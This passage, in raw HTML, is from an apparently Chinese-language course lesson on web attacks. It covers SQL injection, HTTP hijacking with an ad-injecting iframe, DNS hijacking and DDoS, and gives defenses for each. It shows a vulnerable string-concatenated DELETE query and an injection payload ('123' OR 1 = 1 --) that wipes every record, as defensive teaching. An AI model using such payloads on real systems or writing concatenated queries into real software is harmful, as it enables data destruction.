data-slate-object="block" data-key="568"> <span data-slate-object="text" data-key="569"><span 
data-slate-leaf="true" data-offset-key="569:0" data-first-offset="true"><span data-slate-string="true">String 
sql = "</span></span><span data-slate-leaf="true" data-offset-key="569:1"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_7250797505" data-annotation-type="annotation"><span 
data-slate-string="true">DELETE</span></span></span><span data-slate-leaf="true" data-offset-key="569:2"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="569:3"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_9382153829" 
data-annotation-type="annotation"><span data-slate-string="true">FROM</span></span></span><span 
data-slate-leaf="true" data-offset-key="569:4"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="569:5"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9836106592" data-annotation-type="annotation"><span data-slate-string="true">RECORDS</span></span></span><span 
data-slate-leaf="true" data-offset-key="569:6"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="569:7"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_2294441266" data-annotation-type="annotation"><span data-slate-string="true">WHERE</span></span></span><span 
data-slate-leaf="true" data-offset-key="569:8"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="569:9"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_5006082377" data-annotation-type="annotation"><span data-slate-string="true">ID</span></span></span><span 
data-slate-leaf="true" data-offset-key="569:10"><span data-slate-string="true"> = </span></span><span 
data-slate-leaf="true" data-offset-key="569:11"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_3973371842" data-annotation-type="annotation"><span data-slate-string="true">" 
+ id + "</span></span></span><span data-slate-leaf="true" data-offset-key="569:12"><span data-slate-string="true"> 
</span></span><span data-slate-leaf="true" data-offset-key="569:13"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_6154467724" data-annotation-type="annotation"><span 
data-slate-string="true">AND</span></span></span><span data-slate-leaf="true" data-offset-key="569:14"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="569:15"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_4772399344" 
data-annotation-type="annotation"><span data-slate-string="true">STATUS</span></span></span><span 
data-slate-leaf="true" data-offset-key="569:16"><span data-slate-string="true"> = </span></span><span 
data-slate-leaf="true" data-offset-key="569:17"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_3265380358" data-annotation-type="annotation"><span data-slate-string="true">''done''</span></span></span><span 
data-slate-leaf="true" data-offset-key="569:18"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_5076309101" data-annotation-type="annotation"><span data-slate-string="true">"</span></span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 224px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-78489153 " data-slate-type="paragraph" data-slate-object="block" 
data-key="570"> <span data-slate-object="text" data-key="571"><span data-slate-leaf="true" 
data-offset-key="571:0" data-first-offset="true"><span data-slate-string="true">其中，这个 id 表示单条记录，且由用户的表单以字符串参数 
id 的方式提交上来。这条 SQL 的本意是要删除一条以 id 为主键的记录，并且只有其状态在已完成（Status 为 done）的时候才允许删除。</span></span></span> 
</div> <div class="se-62b91cd0 " data-slate-type="paragraph" data-slate-object="block" data-key="572"> 
<span data-slate-object="text" data-key="573"><span data-slate-leaf="true" data-offset-key="573:0" 
data-first-offset="true"><span data-slate-string="true">现在，攻击者在提交的时候精心构造了这样一个字符串参数 id：</span></span></span> 
</div> <div class="se-8d3cfd6f se-b4ea4eea" data-slate-type="pre" data-slate-object="block" 
data-key="574" data-code-language="javascript"> <div class="se-d39ab096 se-4fe5d930"> <span></span> 
</div> <div class="se-c9e050c9"> <div class="se-05814c36 se-3e80be67" data-code-line-number="1"></div> 
</div> <div class="se-7426c141 ps"> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="575"> <span data-slate-object="text" data-key="576"><span 
data-slate-leaf="true" data-offset-key="576:0" data-first-offset="true"><span class=" gkhl-string" 
data-slate-object="annotation" data-annotation-key="gkann_4105406718" data-annotation-type="annotation"><span 
data-slate-string="true">"''123'' OR 1 = 1 --"</span></span></span></span> </div> <div class="ps__rail-x" 
style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 
0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 0px;"> <div class="ps__thumb-y" 
tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> </div> <div class="se-08c36579 
" data-slate-type="paragraph" data-slate-object="block" data-key="577"> <span data-slate-object="text" 
data-key="578"><span data-slate-leaf="true" data-offset-key="578:0" data-first-offset="true"><span 
data-slate-string="true">于是，这条 SQL 语句在拼接后就变成了：</span></span></span> </div> <div class="se-f99e3803 
se-91d76d57" data-slate-type="pre" data-slate-object="block" data-key="579" data-code-language="sql"> 
<div class="se-57a241d7 se-da3c7dd0"> <span></span> </div> <div class="se-94ac6b8e"> <div class="se-3b277ecc 
se-233432d6" data-code-line-number="1"></div> </div> <div class="se-c07bd340 ps ps--active-x"> 
<div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="580"> <span data-slate-object="text" data-key="581"><span data-slate-leaf="true" 
data-offset-key="581:0" data-first-offset="true"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9059591275" data-annotation-type="annotation"><span data-slate-string="true">DELETE</span></span></span><span 
data-slate-leaf="true" data-offset-key="581:1"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="581:2"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1599660102" data-annotation-type="annotation"><span data-slate-string="true">FROM</span></span></span><span 
data-slate-leaf="true" data-offset-key="581:3"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="581:4"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1833659344" data-annotation-type="annotation"><span data-slate-string="true">RECORDS</span></span></span><span 
data-slate-leaf="true" data-offset-key="581:5"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="581:6"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7960176596" data-annotation-type="annotation"><span data-slate-string="true">WHERE</span></span></span><span 
data-slate-leaf="true" data-offset-key="581:7"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="581:8"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1934341884" data-annotation-type="annotation"><span data-slate-string="true">ID</span></span></span><span 
data-slate-leaf="true" data-offset-key="581:9"><span data-slate-string="true"> = </span></span><span 
data-slate-leaf="true" data-offset-key="581:10"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_0798745988" data-annotation-type="annotation"><span data-slate-string="true">''123''</span></span></span><span 
data-slate-leaf="true" data-offset-key="581:11"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="581:12"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8709703697" data-annotation-type="annotation"><span data-slate-string="true">OR</span></span></span><span 
data-slate-leaf="true" data-offset-key="581:13"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="581:14"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_2746065308" data-annotation-type="annotation"><span data-slate-string="true">1</span></span></span><span 
data-slate-leaf="true" data-offset-key="581:15"><span data-slate-string="true"> = </span></span><span 
data-slate-leaf="true" data-offset-key="581:16"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_9019024975" data-annotation-type="annotation"><span data-slate-string="true">1</span></span></span><span 
data-slate-leaf="true" data-offset-key="581:17"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="581:18"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_8379699093" data-annotation-type="annotation"><span data-slate-string="true">-- 
AND STATUS = ''done''</span></span></span></span> </div> <div class="ps__rail-x" style="width: 
365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 
251px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 0px;"> <div class="ps__thumb-y" 
tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> </div> <div class="se-58f3ca67 
" data-slate-type="paragraph" data-slate-object="block" data-key="582"> <span data-slate-object="text" 
data-key="583"><span data-slate-leaf="true" data-offset-key="583:0" data-first-offset="true"><span 
data-slate-string="true">你看，虽然 WHERE 字句包含了对 ID 的判断，但是后面有一个恒真的“或”条件“1 = 1”，而且后面的 STATUS 判断被注释符号“–”给屏蔽掉了。于是，这条恐怖的删除所有记录的 
SQL 就被执行了。</span></span></span> </div> <div class="se-a668caca " data-slate-type="paragraph" 
data-slate-object="block" data-key="584"> <span data-slate-object="text" data-key="585"><span 
data-slate-leaf="true" data-offset-key="585:0" data-first-offset="true"><span data-slate-string="true">现在你可以想象一下 
SQL 注入的影响到底有多么严重了。在本章我已经提到过，程序的问题还好修复或回滚，但是数据造成的损失往往很难修复。</span></span></span> </div> <div 
class="se-f3b33f39 " data-slate-type="paragraph" data-slate-object="block" data-key="586"> 
<span data-slate-object="text" data-key="587"><span data-slate-leaf="true" data-offset-key="587:0" 
data-first-offset="true"><span data-slate-string="true">知道了原理，那么我们就可以采取相应的措施来应对了：</span></span></span> 
</div> <div class="se-953b1118" data-slate-type="list" data-slate-object="block" data-key="588"> 
<div class="se-83f5c6a2 se-fdc63858" data-slate-type="list-line" data-slate-object="block" 
data-key="589"> <span data-slate-object="text" data-key="590"><span data-slate-leaf="true" 
data-offset-key="590:0" data-first-offset="true"><span data-slate-string="true">第一种，对于参数进行转义和过滤，这和我们前面介绍的 
XSS 的应对是一样的。如果参数的格式明确，我们应当较为严格地校验参数，比如上面的例子，如果 id 实际是一个数值，那么用户输入非数值就应当报错。</span></span></span> 
</div> <div class="se-93a59a77 se-f4008240" data-slate-type="list-line" data-slate-object="block" 
data-key="591"> <span data-slate-object="text" data-key="592"><span data-slate-leaf="true" 
data-offset-key="592:0" data-first-offset="true"><span data-slate-string="true">第二种，SQL 的语句执行尽可能采用参数化查询的接口，而不是单纯地当做字符串来拼接。当然，一般在使用持久化框架的时候，这样的事情框架一般都替程序员考虑到了。</span></span></span> 
</div> <div class="se-77beadcf se-5f73fb21" data-slate-type="list-line" data-slate-object="block" 
data-key="593"> <span data-slate-object="text" data-key="594"><span data-slate-leaf="true" 
data-offset-key="594:0" data-first-offset="true"><span data-slate-string="true">第三种，严格的权限控制，这和 
Linux 下面权限控制的原则是一样的，保持“最小授权”原则，即尽可能只授予能实现功能的最小权限。</span></span></span> </div> </div> <h3 class="se-5ce346d7" 
data-slate-type="heading" data-slate-object="block" data-key="595"><span data-slate-object="text" 
data-key="596"><span data-slate-leaf="true" data-offset-key="596:0" data-first-offset="true"><span 
data-slate-string="true">4. HTTP 劫持</span></span></span></h3> <div class="se-941cd70e " data-slate-type="paragraph" 
data-slate-object="block" data-key="597"> <span data-slate-object="text" data-key="598"><span 
data-slate-leaf="true" data-offset-key="598:0" data-first-offset="true"><span data-slate-string="true">HTTP 
劫持的原理很简单，但是却非常常见。就是说，由于 HTTP 协议是明文通信的，它就可以被任意篡改。而干这事儿干得最多的，不是什么传统意义上的“黑客”，而是那些无良的网络服务提供商和运营商们，他们利用对网络控制之便利，通过这种方式强行给用户塞广告。</span></span></span> 
</div> <div class="se-9594edaf " data-slate-type="paragraph" data-slate-object="block" data-key="599"> 
<span data-slate-object="text" data-key="600"><span data-slate-leaf="true" data-offset-key="600:0" 
data-first-offset="true"><span data-slate-string="true">我有一个个人的博客网站，有一次有读者跟我说：“你为什么投放垃圾广告？”一开始我还很纳闷，我可从来没有干过这事儿啊，怎么会有广告，后来才知道，其实，这就是因为遭遇了无良运营商的 
HTTP 劫持。下面的这个截屏（来自</span></span></span><a data-slate-type="link" data-slate-object="inline" 
data-key="601" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" data-key="602"><span 
data-slate-leaf="true" data-offset-key="602:0" data-first-offset="true"><span data-slate-string="true">这篇</span></span></span></a><span 
data-slate-object="text" data-key="603"><span data-slate-leaf="true" data-offset-key="603:0" 
data-first-offset="true"><span data-slate-string="true">文章），右下角的广告就是通过 HTTP 劫持干的。</span></span></span> 
</div> <div class="se-47c4a3fa" data-slate-type="image" data-slate-object="block" data-key="604"> 
<img class="se-0a0a1dd9" src="https://static001.geekbang.org/resource/image/68/ad/688d25f375621722af79cb7330427fad.jpg"> 
</div> <div class="se-2d736859 " data-slate-type="paragraph" data-slate-object="block" data-key="605"> 
<span data-slate-object="text" data-key="606"><span data-slate-leaf="true" data-offset-key="606:0" 
data-first-offset="true"><span data-slate-string="true">虽然可以任意修改 HTTP 响应报文，但是修改就可能带来对原页面的影响。于是，攻击者为了对用户造成的影响尽量小，而达到“单纯”地投放广告的目的，很可能会使用 
iFrame。它利用了 iFrame 和母页面相对独立的特性，比方说：</span></span></span> </div> <div class="se-4374f6ec se-51b8b1da" 
data-slate-type="pre" data-slate-object="block" data-key="607" data-code-language="javascript"> 
<div class="se-8f624c01 se-3312fe41"> <span></span> </div> <div class="se-70710cbf"> <div class="se-af6076f9 
se-260f710c" data-code-line-number="1"></div> </div> <div class="se-6cda8af3 ps ps--active-x"> 
<div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="608"> <span data-slate-object="text" data-key="609"><span data-slate-leaf="true" 
data-offset-key="609:0" data-first-offset="true"><span data-slate-string="true">&lt;iframe 
id=</span></span><span data-slate-leaf="true" data-offset-key="609:1"><span class=" gkhl-string" 
data-slate-object="annotation" data-annotation-key="gkann_7154364292" data-annotation-type="annotation"><span 
data-slate-string="true">"fulliframe"</span></span></span><span data-slate-leaf="true" data-offset-key="609:2"><span 
data-slate-string="true"> name=</span></span><span data-slate-leaf="true" data-offset-key="609:3"><span 
class=" gkhl-string" data-slate-object="annotation" data-annotation-key="gkann_1569536632" 
data-annotation-type="annotation"><span data-slate-string="true">"fulliframe"</span></span></span><span 
data-slate-leaf="true" data-offset-key="609:4"><span data-slate-string="true"> frameSpacing=</span></span><span 
data-slate-leaf="true" data-offset-key="609:5"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_6783682986" data-annotation-type="annotation"><span data-slate-string="true">0</span></span></span><span 
data-slate-leaf="true" data-offset-key="609:6"><span data-slate-string="true"> noResize height=</span></span><span 
data-slate-leaf="true" data-offset-key="609:7"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_4645117147" data-annotation-type="annotation"><span data-slate-string="true">1350</span></span></span><span 
data-slate-leaf="true" data-offset-key="609:8"><span data-slate-string="true"> marginHeight=</span></span><span 
data-slate-leaf="true" data-offset-key="609:9"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_2979435315" data-annotation-type="annotation"><span data-slate-string="true">0</span></span></span><span 
data-slate-leaf="true" data-offset-key="609:10"><span data-slate-string="true"> border=</span></span><span 
data-slate-leaf="true" data-offset-key="609:11"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_6698522667" data-annotation-type="annotation"><span data-slate-string="true">0</span></span></span><span 
data-slate-leaf="true" data-offset-key="609:12"><span data-slate-string="true"> src=</span></span><span 
data-slate-leaf="true" data-offset-key="609:13"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_6284208591" data-annotation-type="annotation"><span data-slate-string="true">" 
原网页 "</span></span></span><span data-slate-leaf="true" data-offset-key="609:14"><span data-slate-string="true"> 
frameBorder=</span></span><span data-slate-leaf="true" data-offset-key="609:15"><span class=" 
gkhl-number" data-slate-object="annotation" data-annotation-key="gkann_0399035136" data-annotation-type="annotation"><span 
data-slate-string="true">0</span></span></span><span data-slate-leaf="true" data-offset-key="609:16"><span 
data-slate-string="true"> width=</span></span><span data-slate-leaf="true" data-offset-key="609:17"><span 
class=" gkhl-string" data-slate-object="annotation" data-annotation-key="gkann_3923996631" 
data-annotation-type="annotation"><span data-slate-string="true">"100%"</span></span></span><span 
data-slate-leaf="true" data-offset-key="609:18"><span data-slate-string="true"> scrolling=no 
vspale=</span></span><span data-slate-leaf="true" data-offset-key="609:19"><span class=" gkhl-string" 
data-slate-object="annotation" data-annotation-key="gkann_1717572126" data-annotation-type="annotation"><span 
data-slate-string="true">"0"</span></span></span><span data-slate-leaf="true" data-offset-key="609:20"><span 
data-slate-string="true">&gt;&lt;/iframe&gt;</span></span></span> </div> <div class="ps__rail-x" 
style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" style="left: 
0px; width: 97px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 0px;"> <div 
class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> </div> 
<div class="se-4e8418d7 " data-slate-type="paragraph" data-slate-object="block" data-key="610"> 
<span data-slate-object="text" data-key="611"><span data-slate-leaf="true" data-offset-key="611:0" 
data-first-offset="true"><span data-slate-string="true">你看，原网页被装到了一个 iFrame 里面去，并且这个 iFrame 
没有边，大小占据了整个浏览器，因此用户很可能不知情，但是，整个页面实际已经被替换掉了，那么也就可以在这个 iFrame 以外添加浮动广告了。</span></span></span> 
</div> <div class="se-13aa6594 " data-slate-type="paragraph" data-slate-object="block" data-key="612"> 
<span data-slate-object="text" data-key="613"><span data-slate-leaf="true" data-offset-key="613:0" 
data-first-offset="true"><span data-slate-string="true">对于 HTTP 劫持，由于攻击者利用了 HTTP 明文传输的特性，因此解决方案很简单，就是将网站切换为 
HTTPS。至于其它的方法，相对都比较特例化，并不一般和通用，只有将传输加密才是最理想的解决方案。</span></span></span> </div> <h3 class="se-f51227c6" 
data-slate-type="heading" data-slate-object="block" data-key="614"><span data-slate-object="text" 
data-key="615"><span data-slate-leaf="true" data-offset-key="615:0" data-first-offset="true"><span 
data-slate-string="true">5. DNS 劫持</span></span></span></h3> <div class="se-092ab303 " data-slate-type="paragraph" 
data-slate-object="block" data-key="616"> <span data-slate-object="text" data-key="617"><span 
data-slate-leaf="true" data-offset-key="617:0" data-first-offset="true"><span data-slate-string="true">DNS 
劫持的原理也很简单（你如果忘记了 DNS 的工作机制，可以回看 </span></span></span><a data-slate-type="link" data-slate-object="inline" 
data-key="618" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" data-key="619"><span 
data-slate-leaf="true" data-offset-key="619:0" data-first-offset="true"><span data-slate-string="true">[第 
29 讲]</span></span></span></a><span data-slate-object="text" data-key="620"><span data-slate-leaf="true" 
data-offset-key="620:0" data-first-offset="true"><span data-slate-string="true">），用户的浏览器在通过 
DNS 查询目标域名对应的 IP 地址的时候，会被攻击者引导到一个恶意网站的地址。这个假的网站也可以有相似的页面布局，也可能有“正规”方式申请的 HTTPS 证书，换言之，</span></span></span><span 
data-slate-object="text" data-key="621"><span data-slate-leaf="true" data-offset-key="621:0" 
data-first-offset="true"><span class="se-7b3eb8a9" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">HTTPS 加密通信并不能防范 DNS 劫持</span></span></span></span><span data-slate-object="text" 
data-key="622"><span data-slate-leaf="true" data-offset-key="622:0" data-first-offset="true"><span 
data-slate-string="true">，因此用户很可能被欺骗而不察觉。</span></span></span> </div> <div class="se-7c262754 
" data-slate-type="paragraph" data-slate-object="block" data-key="623"> <span data-slate-object="text" 
data-key="624"><span data-slate-leaf="true" data-offset-key="624:0" data-first-offset="true"><span 
data-slate-string="true">如果你还不是很理解，那让我再来进一步解释。当浏览器敲入域名地址并回车，用户在网上冲浪的整个过程，一环套一环，只要有任何一环存在安全隐患，那么其它环节的安全工作做得再好也是没有用的。DNS 
假如被劫持了，浏览器都去和一个假冒的网站通信了，HTTPS 加密做的也只是保证你和这个假冒网站通信的完整性、保密性，那还有何用？</span></span></span><span 
data-slate-object="text" data-key="625"><span data-slate-leaf="true" data-offset-key="625:0" 
data-first-offset="true"><span class="se-07ced9ed" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">就好比要去药店买药，可去了家假的药店，那么保证整个交易过程的安全性就失去了它原本的意义了。</span></span></span></span> 
</div> <div class="se-3c40cead " data-slate-type="paragraph" data-slate-object="block" data-key="626"> 
<span data-slate-object="text" data-key="627"><span data-slate-leaf="true" data-offset-key="627:0" 
data-first-offset="true"><span data-slate-string="true">对于真正开发维护 Web 网站或应用的程序员来说，DNS 劫持相对来说比较难以防范，因为 
DNS 解析的步骤，从整个过程来看，请求根本还没有到达实际的应用，确实有些无能为力。</span></span></span> </div> <div class="se-b9745b8d 
" data-slate-type="paragraph" data-slate-object="block" data-key="628"> <span data-slate-object="text" 
data-key="629"><span data-slate-leaf="true" data-offset-key="629:0" data-first-offset="true"><span 
data-slate-string="true">事实上，</span></span></span><span data-slate-object="text" data-key="630"><span 
data-slate-leaf="true" data-offset-key="630:0" data-first-offset="true"><span class="se-5ff40681" 
data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">安全防范的各个环节就像一个木桶的各个木板，网络公共服务的安全性，经常决定了用户网上冲浪安全性的上限。</span></span></span></span><span 
data-slate-object="text" data-key="631"><span data-slate-leaf="true" data-offset-key="631:0" 
data-first-offset="true"><span data-slate-string="true">2010 年的</span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="632" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" 
data-key="633"><span data-slate-leaf="true" data-offset-key="633:0" data-first-offset="true"><span 
data-slate-string="true">百度被黑事件</span></span></span></a><span data-slate-object="text" data-key="634"><span 
data-slate-leaf="true" data-offset-key="634:0" data-first-offset="true"><span data-slate-string="true">，就是遭遇了 
DNS 劫持。由于 DNS 解析的过程比较长，劫持可能发生在网络，也可以发生在本机（别忘了本机有 hosts 文件），还可能发生在某一个子网的路由。对于 DNS 网络明文通信带来的隐患，有一个安全的域名解析方案，叫做 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="635" class="se-d795ea91 
se-eb2c7cbb"><span data-slate-object="text" data-key="636"><span data-slate-leaf="true" data-offset-key="636:0" 
data-first-offset="true"><span data-slate-string="true">DNS over HTTPS</span></span></span></a><span 
data-slate-object="text" data-key="637"><span data-slate-leaf="true" data-offset-key="637:0" 
data-first-offset="true"><span data-slate-string="true">，目前还在实验阶段，仅有部分 DNS 服务支持。</span></span></span> 
</div> <h3 class="se-8d42b5bf" data-slate-type="heading" data-slate-object="block" data-key="638"><span 
data-slate-object="text" data-key="639"><span data-slate-leaf="true" data-offset-key="639:0" 
data-first-offset="true"><span data-slate-string="true">6. DDoS 攻击</span></span></span></h3> 
<div class="se-efd8b01d " data-slate-type="paragraph" data-slate-object="block" data-key="640"> 
<span data-slate-object="text" data-key="641"><span data-slate-leaf="true" data-offset-key="641:0" 
data-first-offset="true"><span data-slate-string="true">最后我来简单介绍一下 DDoS，Distributed Denial-of-Service，分布式拒绝服务，这种攻击方式从理论上说，最难以防范，被称为互联网的“癌症”。</span></span></span> 
</div> <div class="se-bf0f0f27 " data-slate-type="paragraph" data-slate-object="block" data-key="642"> 
<span data-slate-object="text" data-key="643"><span data-slate-leaf="true" data-offset-key="643:0" 
data-first-offset="true"><span data-slate-string="true">为什么呢？因为它的原理是，攻击者使用若干被“攻陷”的电脑（比如被病毒占领和控制的“肉鸡”），向网络应用和服务同一时间发起请求，通过一瞬间的请求洪峰，将服务冲垮。</span></span></span> 
</div> <div class="se-40d5fe63 " data-slate-type="paragraph" data-slate-object="block" data-key="644"> 
<span data-slate-object="text" data-key="645"><span data-slate-leaf="true" data-offset-key="645:0" 
data-first-offset="true"><span class="se-871bb3ec" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">DDoS 攻击的目的不是偷窃用户数据，也不是为了仿冒用户身份，而是“无差别”阻塞网络，引发“拒绝服务”，让正常使用网站和应用的用户难以继续使用，这个“无差别”最要命，简单、粗暴，但却有效。</span></span></span></span> 
</div> <div class="se-cc8f1529 " data-slate-type="paragraph" data-slate-object="block" data-key="646"> 
<span data-slate-object="text" data-key="647"><span data-slate-leaf="true" data-offset-key="647:0" 
data-first-offset="true"><span data-slate-string="true">因此对于 DDoS 的攻击，我们需要整个网络链路配合，包括路由器、交换机、防火墙等等组件，采取入侵检测和流量过滤等多种方式来联合防范。这部分的内容涉及比较多，我在扩展阅读放了一点材料，感兴趣的话可以阅读。</span></span></span> 
</div> <h2 class="se-03bd29bc" data-slate-type="heading" data-slate-object="block" data-key="648"><span 
data-slate-object="text" data-key="649"><span data-slate-leaf="true" data-offset-key="649:0" 
data-first-offset="true"><span data-slate-string="true">总结思考</span></span></span></h2> <div 
class="se-6499499a " data-slate-type="paragraph" data-slate-object="block" data-key="650"> 
<span data-slate-object="text" data-key="651"><span data-slate-leaf="true" data-offset-key="651:0" 
data-first-offset="true"><span data-slate-string="true">今天我们重点学习了常见的几种 Web 攻击方式，希望你从中学到了一些网站安全问题的知识和相应的应对办法，毕竟，安全无小事。</span></span></span> 
</div> <div class="se-db336e89 " data-slate-type="paragraph" data-slate-object="block" data-key="652"> 
<span data-slate-object="text" data-key="653"><span data-slate-leaf="true" data-offset-key="653:0" 
data-first-offset="true"><span data-slate-string="true">下面来提两个问题吧：</span></span></span> </div> 
<div class="se-c5612eb7" data-slate-type="list" data-slate-object="block" data-key="654"> <div 
class="se-c24f4fa2 se-b8b3d28c" data-slate-type="list-line" data-slate-object="block" data-key="655"> 
<span data-slate-object="text" data-key="656"><span data-slate-leaf="true" data-offset-key="656:0" 
data-first-offset="true"><span data-slate-string="true">手动输入验证码的功能如今已经被广泛使用了，你觉得对于今天介绍的攻击方式，验证码可以用来防范它们中的哪一些？</span></span></span> 
</div> <div class="se-39c645e6 se-2fc746f2" data-slate-type="list-line" data-slate-object="block" 
data-key="657"> <span data-slate-object="text" data-key="658"><span data-slate-leaf="true" 
data-offset-key="658:0" data-first-offset="true"><span data-slate-string="true">假如你需要设计一个电商的网上支付功能，用于在线购买商品，用户需要填写信用卡信息并提交。对于这个过程，从安全的角度看，你觉得有哪些措施是必须要采取，从而提高支付行为整体的安全性的？</span></span></span> 
</div> </div> <h2 class="se-c4f91389" data-slate-type="heading" data-slate-object="block" data-key="659"><span 
data-slate-object="text" data-key="660"><span data-slate-leaf="true" data-offset-key="660:0" 
data-first-offset="true"><span data-slate-string="true">扩展阅读</span></span></span></h2> <div 
class="se-296f9318" data-slate-type="list" data-slate-object="block" data-key="661"> <div class="se-0dba25b9 
se-7e52ed7f" data-slate-type="list-line" data-slate-object="block" data-key="662"> <span data-slate-object="text" 
data-key="663"><span data-slate-leaf="true" data-offset-key="663:0" data-first-offset="true"><span 
data-slate-string="true">文中提到了 HttpOnly 标识，想了解更多细节你可以阅读</span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="664" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" 
data-key="665"><span data-slate-leaf="true" data-offset-key="665:0" data-first-offset="true"><span 
data-slate-string="true">这篇文章</span></span></span></a><span data-slate-object="text" data-key="666"><span 
data-slate-leaf="true" data-offset-key="666:0" data-first-offset="true"><span data-slate-string="true">。</span></span></span> 
</div> <div class="se-0eedfe3c se-aae0b980" data-slate-type="list-line" data-slate-object="block" 
data-key="667"> <span data-slate-object="text" data-key="668"><span data-slate-leaf="true" 
data-offset-key="668:0" data-first-offset="true"><span data-slate-string="true">文中提到了 HTTP 
的 Referer 头，你可以参阅</span></span></span><a data-slate-type="link" data-slate-object="inline" 
data-key="669" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" data-key="670"><span 
data-slate-leaf="true" data-offset-key="670:0" data-first-offset="true"><span data-slate-string="true">维基百科</span></span></span></a><span 
data-slate-object="text" data-key="671"><span data-slate-leaf="true" data-offset-key="671:0" 
data-first-offset="true"><span data-slate-string="true">获得更详细的介绍。</span></span></span> </div> 
<div class="se-5dbff023 se-46f42aaf" data-slate-type="list-line" data-slate-object="block" 
data-key="672"> <span data-slate-object="text" data-key="673"><span data-slate-leaf="true" 
data-offset-key="673:0" data-first-offset="true"><span data-slate-string="true">文中提到了 SQL 的参数化查询，如果不了解，可以阅读这篇</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="674" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="675"><span data-slate-leaf="true" data-offset-key="675:0" 
data-first-offset="true"><span data-slate-string="true">介绍</span></span></span></a><span data-slate-object="text" 
data-key="676"><span data-slate-leaf="true" data-offset-key="676:0" data-first-offset="true"><span 
data-slate-string="true">。</span></span></span> </div> <div class="se-0c1d14d7 se-aad9e9a8" 
data-slate-type="list-line" data-slate-object="block" data-key="677"> <span data-slate-object="text" 
data-key="678"><span data-slate-leaf="true" data-offset-key="678:0" data-first-offset="true"><span 
data-slate-string="true">关于 DDoS 攻击的分类，可以参阅这个</span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="679" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" 
data-key="680"><span data-slate-leaf="true" data-offset-key="680:0" data-first-offset="true"><span 
data-slate-string="true">词条</span></span></span></a><span data-slate-object="text" data-key="681"><span 
